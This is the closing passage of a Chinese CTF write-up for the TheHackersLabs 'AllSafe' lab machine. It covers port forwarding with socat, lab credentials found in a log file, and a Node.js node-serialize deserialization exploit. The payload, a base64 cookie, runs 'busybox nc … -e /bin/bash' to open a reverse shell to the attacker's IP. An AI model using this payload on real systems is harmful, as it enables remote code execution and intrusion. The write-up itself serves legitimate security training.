class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*                                              \ntcp                    LISTEN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">511</span>                                          <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">3000</span>                                           <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*                                              \ntcp                    LISTEN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">4096</span>                                              [::]:<span class=\"hljs-number\">80</span>                                                [::]:*                                              \ntcp                    LISTEN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">128</span>                                               [::]:<span class=\"hljs-number\">22</span>                                                [::]:*                                              \ntcp                    LISTEN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">4096</span>                                              [::]:<span class=\"hljs-number\">2222</span>                                              [::]:* \n</code></pre>\n<h3>Node.js 反序列化</h3>\n<p>3000 端口还是一个 <code>web</code> ，登录框</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image21.png\" alt=\"image.png\"></p>\n<p>将 <code>3000</code> 端口转发出来</p>\n<pre><code class=\"hljs language-python\">./socat TCP-LISTEN:<span class=\"hljs-number\">3001</span>,fork TCP4:<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">3000</span> &#x26;\n</code></pre>\n<p>是一个登录框，需要三个参数</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image22.png\" alt=\"image.png\"></p>\n<p>分别输入 <code>cisco</code> <code>dark-ops</code> <code>drk2025!</code> 提示认证错误</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image23.png\" alt=\"image.png\"></p>\n<p>在 <code>/vat/log</code> 中发现 <code>app.log</code> ，不常见</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image24.png\" alt=\"image.png\"></p>\n<p>在里边能得到两个凭据</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image25.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">DLFJYxLLSzp1x5Ttpsffpg2awuJT5K\n</code></pre>\n<p>将密码换成 <code>DLFJYxLLSzp1x5Ttpsffpg2awuJT5K</code> 成功连接，聊天还是用中文（</p>\n<p>这里尝试一下 SQL 注入，SSTI 之类的，也没能找到什么</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image26.png\" alt=\"image.png\"></p>\n<p>需要知道 3000 端口运行在什么程序上，查看一下抓的包</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image27.png\" alt=\"image.png\"></p>\n<p>因为 <code>Socket.IO</code> 是 Node.js 的流行实时库，所以猜测它是 <code>Node.js</code></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image28.png\" alt=\"image.png\"></p>\n<p>在查看进程时也能看到 root 运行了 nodejs</p>\n<pre><code class=\"hljs language-python\">root         <span class=\"hljs-number\">308</span>  <span class=\"hljs-number\">0.0</span>  <span class=\"hljs-number\">1.6</span> <span class=\"hljs-number\">1248480</span> <span class=\"hljs-number\">67224</span> ?       Ssl  06:<span class=\"hljs-number\">28</span>   <span class=\"hljs-number\">0</span>:01 node server.js \n</code></pre>\n<p>还发现了这个 <code>Cookie</code> 是仅仅通过 Base64 加密了而已，模拟了其他用户后也没什么卵用</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image29.png\" alt=\"image.png\"></p>\n<p>看了一下老夜和国外老友的WP（<a href=\"https://7r1umphk.github.io/post/thl_allsafe.html%EF%BC%89%EF%BC%88https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md%EF%BC%89%E6%89%8D%E7%9F%A5%E9%81%93%E8%BF%99%E9%87%8C%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\">https://7r1umphk.github.io/post/thl_allsafe.html）（https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md）才知道这里有反序列化漏洞</a></p>\n<p>一些文章：<a href=\"https://cloud.tencent.com/developer/article/1374840\">https://cloud.tencent.com/developer/article/1374840</a></p>\n<p>payload：</p>\n<pre><code class=\"hljs language-python\">{<span class=\"hljs-string\">\"rce\"</span>:<span class=\"hljs-string\">\"_$$ND_FUNC$$_function(){require('child_process').exec('busybox nc 192.168.56.5 1234 -e /bin/bash', function(error,stdout,stderr){})}()\"</span>}\n</code></pre>\n<p>进行 <code>base64</code> 编码，替换上去</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image30.png\" alt=\"image.png\"></p>\n<p>来到控制台，输入如下命令，先断开套接字并重新连接，服务器就会重新反序列化</p>\n<pre><code class=\"hljs language-python\">socket.close()\nsocket.connect()\n</code></pre>\n<p>读取 <code>root.txt</code> 即可</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image31.png\" alt=\"image.png\"></p>\n<h2>总结</h2>\n<p>要耐心 耐心 耐心 耐心</p>","title":"TheHackersLabs - AllSafe","date":"2025-10-21","updated":"2025-10-21","tags":["TheHackerLabs","Linux","LFI","FUZZ","PasswordSafe","Make","Nodejs反序列化"],"categories":"靶机","comments":true,"description":"AllSafe https://labs.thehackerslabs.com/machine/139 Recon PortScan 枚举 80 端口，域名是 allsafe.thl 目录扫描，扫出来的东西太多就不放出来了，也没什么可以看的 主站中还有一个功能，可以提交网址，所以索性测试了 SSRF..."},"recentPosts":[{"id":"HackMyVMRealsaga","title":"HackMyVM - Realsaga","date":"2025-12-16","isEncrypted":false,"year":"2025","month":"12","day":"16"},{"id":"Machinevictorique","title":"Machine - victorique","date":"2025-12-13","isEncrypted":true,"year":"2025","month":"12","day":"13"},{"id":"TheHackersLabsKoi Stealer","title":"TheHackersLabs - Koi Stealer","date":"2025-12-06","isEncrypted":false,"year":"2025","month":"12","day":"06"},{"id":"HackMyVMSkid","title":"HackMyVM - Skid","date":"2025-12-03","isEncrypted":false,"year":"2025","month":"12","day":"03"},{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"}]},"__N_SSG":true}